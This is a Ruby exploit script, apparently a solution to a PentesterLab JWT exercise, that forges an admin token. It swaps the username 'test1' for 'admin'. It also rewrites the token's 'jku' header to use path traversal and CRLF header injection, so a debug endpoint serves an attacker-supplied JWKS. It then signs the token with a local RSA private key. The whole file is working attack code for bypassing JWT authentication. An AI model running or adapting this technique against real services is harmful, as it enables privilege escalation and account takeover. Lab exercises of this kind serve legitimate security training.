require 'uri'
require 'base64'
require 'openssl'
require 'json'

cookie = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wdGwtYWE0OWY4NGYtNzIzMDQ0NWQubGliY3VybC5zby8ud2VsbC1rbm93bi8vandrcy5qc29uIn0.eyJ1c2VyIjoidGVzdDEifQ.nwa1sKEJIG5L5zVSAIrM7zsMTItW0OgIWSYf5Icn_JjHWZYsmG1VGPRhQ_-RtZDxM0f_nioCVfmsBN5OGvXHUoIcGKrCBLp5R-t8Mott_t7146aQicd1Jex7iJbpPPDUHQRDQBXEl6_YFqjSpzhEMKEGdNZZcj5SXr5Q_pJCzLeGTUOwnkcbTpxPnh5bPXMv9ogKUluzISSvGE4XGc_Dv2DY9F7WcPE6aYbQLz1rOYAxCzr6OkSW1XIHa7kiyxS1ZFVf7ui1ZQqrIf5lqs_YAuwCQ_gg3ELCviGq1BVmiEOsHMYHJj-hZJ-qjJMGlMrd_KT6HctZ1VfFrVRcb5dlEA'

header, payload, signature = cookie.split('.')

decoded_header = Base64.decode64(header)
decoded_payload = Base64.decode64(payload)

decoded_payload.gsub!("test1","admin")
decoded_header.gsub!("http://ptl-aa49f84f-7230445d.libcurl.so/.well-known//jwks.json",'http://ptl-aa49f84f-7230445d.libcurl.so/.well-known/../debug?value=1337%0d%0aContent-Length:%20498%0d%0aConnection:%20close%0d%0aContent-Type:%20application/json%0d%0a%0d%0a{"keys":[{"kty":"RSA","use":"sig","kid":"pentesterlab","n":"1sxTAp-Fd4GgYfx4N9VIylnQa_kASRRNVcAMKjmixCD9zOEBG_M99pXckyDCKxsTk0L91KXTglJc2HeN1K2l9jO8Iwbap06l0soCojaIuLIqhjWjrEa6CnfyJG8JROnAWV2-lE4jR58Bj_SKxFDvTE-c1eXhvguKpejvRSAvI148i7GNyzez-9QH3tXw8gRTJpsh7hLehGRk0wUMKHrWLOgSfP2LIKsYRx9-sCes209_0SgwhfTMBZrlfOJHATu45wYZvjUVp8hEjylbLQHmSpP1_ME6oyDO1s0ld9UdY-yqb733AL6QDrsMC4HEvr-AmVANP6vIK6U4OU8w_giyPw","e":"AQAB","alg":"RS256"}]}')

body='{"keys":[{"kty":"RSA","use":"sig","kid":"pentesterlab","n":"1sxTAp-Fd4GgYfx4N9VIylnQa_kASRRNVcAMKjmixCD9zOEBG_M99pXckyDCKxsTk0L91KXTglJc2HeN1K2l9jO8Iwbap06l0soCojaIuLIqhjWjrEa6CnfyJG8JROnAWV2-lE4jR58Bj_SKxFDvTE-c1eXhvguKpejvRSAvI148i7GNyzez-9QH3tXw8gRTJpsh7hLehGRk0wUMKHrWLOgSfP2LIKsYRx9-sCes209_0SgwhfTMBZrlfOJHATu45wYZvjUVp8hEjylbLQHmSpP1_ME6oyDO1s0ld9UdY-yqb733AL6QDrsMC4HEvr-AmVANP6vIK6U4OU8w_giyPw","e":"AQAB","alg":"RS256"}]}'
len = body.size
url = "http://ptl-aa49f84f-7230445d.libcurl.so/.well-known/../debug?value=1337%0d%0aContent-Length:%20#{len}%0d%0aConnection:%20close%0d%0aContent-Type:%20application/json%0d%0a%0d%0a"


puts "URL\n"+url+body

puts decoded_header
puts decoded_payload

token = Base64.urlsafe_encode64(decoded_header).gsub("=","") + "." + Base64.urlsafe_encode64(decoded_payload).gsub("=", "")

priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
pub = priv.public_key
n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")

puts "n: " + n
puts "e: " + e

sign = priv.sign("SHA256", token)
puts token +"." + Base64.urlsafe_encode64(sign).gsub(/=+$/, "")

